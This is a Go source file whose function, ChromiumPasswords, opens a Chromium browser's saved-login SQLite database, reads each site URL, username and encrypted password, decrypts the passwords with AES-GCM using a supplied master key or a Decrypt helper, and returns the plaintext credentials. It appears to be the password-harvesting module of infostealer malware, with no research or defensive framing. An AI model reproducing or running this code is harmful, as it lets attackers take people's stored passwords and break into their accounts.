package endpoint

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"fmt"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

func ChromiumPasswords(paths string, masterKey []byte) []string {
	txt_password := []string{""}
	db, err := sql.Open("sqlite3", paths)
	if err == nil {
		defer db.Close()
		rows, err := db.Query("select origin_url, username_value, password_value from logins")
		if err == nil {
			defer rows.Close()

			for rows.Next() {
				var URL string
				var USERNAME string
				var PASSWORD string

				err = rows.Scan(&URL, &USERNAME, &PASSWORD)
				if err == nil {
					if strings.HasPrefix(PASSWORD, "v10") {
						PASSWORD = strings.Trim(PASSWORD, "v10")
						if string(masterKey) != "" {
							ciphertext := []byte(PASSWORD)
							c, err := aes.NewCipher(masterKey)
							if err == nil {
								gcm, err := cipher.NewGCM(c)
								if err == nil {

									nonceSize := gcm.NonceSize()
									if len(ciphertext) < nonceSize {
										geterr(err)
									}
									nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
									plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
									if err == nil {
										if string(plaintext) != "" {
											txt_password = append(txt_password, fmt.Sprint("URL: "+URL+"\nUSERNAME: "+USERNAME+"\nVALUE: "+string(plaintext), "\n", "\n"))
										}
									}
								}
							}
						}
					} else {
						pass, err := Decrypt([]byte(PASSWORD))
						if err == nil {
							txt_password = append(txt_password, fmt.Sprint("URL: "+URL+"\nUSERNAME: "+USERNAME+"\nVALUE: "+string(pass), "\n", "\n"))
						}
					}
				}
			}
		}
	}

	return txt_password
}
